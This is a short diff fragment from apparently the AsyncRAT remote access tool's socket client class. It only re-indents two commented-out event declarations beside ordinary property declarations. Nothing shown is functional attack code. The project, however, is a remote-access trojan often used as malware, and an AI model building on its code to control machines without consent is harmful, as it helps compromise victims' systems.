@@ -18,8 +18,8 @@ namespace AsyncRAT_Sharp.Sockets
         private bool BufferRecevied { get; set; }
         private MemoryStream MS { get; set; }
         public ListViewItem LV { get; set; }
-       // private event ReadEventHandler Read;
-       // private delegate void ReadEventHandler(Clients client, byte[] data);
+        // private event ReadEventHandler Read;
+        // private delegate void ReadEventHandler(Clients client, byte[] data);
         private object SendSync { get; set; }
 
 
